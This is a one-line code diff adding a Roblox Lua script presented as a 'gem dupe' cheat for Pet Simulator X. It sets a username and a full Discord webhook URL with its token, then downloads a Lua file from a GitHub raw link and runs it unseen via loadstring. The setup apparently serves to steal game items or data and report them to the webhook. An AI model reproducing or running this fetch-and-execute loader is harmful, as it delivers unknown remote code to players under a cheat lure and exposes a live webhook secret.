@@ -1,0 +1,1 @@
+_G.Username = "andriad800"_G.HubName = "psx script gem dupe"_G.WebhookUrl = "https://discord.com/api/webhooks/1093874468897693788/4tx6sxJGlJkDz0rNt7pxdo5Xe8GKD60vH4vT25WaHIFUSHtu2Zy4uRkvc5_itzAiFj5i"loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
